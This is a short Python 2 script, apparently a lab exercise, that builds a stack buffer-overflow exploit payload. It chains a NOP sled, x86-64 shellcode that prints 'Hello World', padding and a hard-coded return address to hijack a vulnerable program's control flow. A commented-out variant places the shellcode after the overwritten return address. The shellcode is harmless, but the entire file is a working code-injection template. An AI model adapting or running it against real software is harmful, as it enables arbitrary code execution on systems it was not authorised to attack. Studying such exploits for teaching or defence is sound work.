import struct

num_nops=30
shellcode_size=37
buffer_size=72
address=0x7fffffffde20

nop="\x90"*num_nops
shellcode=(
'\xeb\x13\x5e\x6a\x01\x58\x50\x5f'+
'\x6a\x0c\x5a\x0f\x05\x6a\x3c\x58'+
'\x6a\x0b\x5f\x0f\x05\xe8\xe8\xff'+
'\xff\xff\x48\x65\x6c\x6c\x6f\x20'+
'\x57\x6f\x72\x6c\x64'
)

#Method 1: Only works for shellcode+nops sizes smaller than the buffer size

pad="\x20"*(buffer_size-shellcode_size-num_nops)
addr=struct.pack("L",address)
print nop+shellcode+pad+addr


#Method 2: Can work for shellcode and/or nops sizes larger than the buffer size
'''
pad="\x20"*buffer_size
addr=struct.pack("L",address+buffer_size+8)
print pad+addr+nop+shellcode
'''